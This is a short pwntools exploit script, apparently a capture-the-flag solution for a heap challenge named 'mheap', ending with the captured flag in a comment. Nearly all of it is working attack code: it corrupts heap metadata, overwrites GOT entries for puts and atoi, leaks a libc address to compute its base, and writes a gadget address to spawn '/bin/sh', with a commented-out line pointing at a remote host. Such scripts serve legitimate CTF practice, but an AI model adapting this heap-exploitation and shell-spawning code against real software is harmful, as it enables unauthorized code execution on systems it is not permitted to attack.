from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(idx,size,c='A\n'):
	cmd(1)
	cmd(idx)
	cmd(size)
	p.sendafter(": ",c)
def show(idx):
	cmd(2)
	cmd(idx)
def free(idx):
	cmd(3)
	cmd(idx)
def edit(idx,c):
	cmd(4)
	cmd(idx)
	p.send(c)
context.log_level='debug'
p=process('./mheap')
#p=remote("112.126.98.5",9999)
add(0,0x800,"A"*0x3+'\n')
add(1,0x790,"X"*0x10+'\n')
add(2,0x20,"T"*0x20)

free(1)
free(2)
add(3,0x50,p64(0x30)+p64(0x0000000004040d0)+'\xff'*0x3f+'\n')
add(4,0x23330fb0-0x10,"A\n")
atoi=0x000000000404050
puts=0x000000000404018
edit(4,p64(puts)+p64(atoi))
show(1)
base=u64(p.readline()[:-1].ljust(8,'\x00'))-(0x7ffff7a24680-0x7ffff79e4000)
edit(1,p64(0x4f440+base)+'\n')
log.warning(hex(base))
#gdb.attach(p,'b *0x0000000004011EA')

cmd("/bin/sh\x00")

p.interactive()
#bytectf{34f7e6dd6acf03192d82f0337c8c54ba}
